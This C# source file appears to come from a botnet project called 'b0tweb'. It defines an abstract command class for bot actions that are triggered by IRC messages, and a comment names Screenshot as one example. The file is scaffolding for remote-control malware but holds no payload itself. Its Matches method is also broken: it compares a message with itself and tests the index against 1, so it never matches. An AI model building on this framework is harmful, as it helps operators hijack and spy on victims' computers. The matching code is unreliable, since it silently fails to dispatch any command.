using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace b0tweb.Commands
{
    /// <summary>
    /// Class <c>AbstractCommand</c> implements the basics of the commands implemented
    /// into this botnet. Each command has a single function that will execute. For example
    /// <c>Screenshot</c> will handle the screenshot functionality.
    /// </summary>
    abstract class AbstractCommand
    {
        /// <summary>
        /// Name of the command. For example <c>Screenshot</c>.
        /// </summary>
        abstract public string Command { get; }

        /// <summary>
        /// Execute the command based on the message given.
        /// </summary>
        /// <param name="message">The message received via IRC.</param>
        /// <returns></returns>
        abstract public string Execute(string message);

        /// <summary>
        /// Check if the command matches the requested action from the IRC message.
        /// </summary>
        /// <param name="message">The message received via IRC.</param>
        /// <returns>If the command matches the requested action from the IRC message.</returns>
        public bool Matches(string message)
        {
            return message.IndexOf(message) == 1;
        }
    }
}
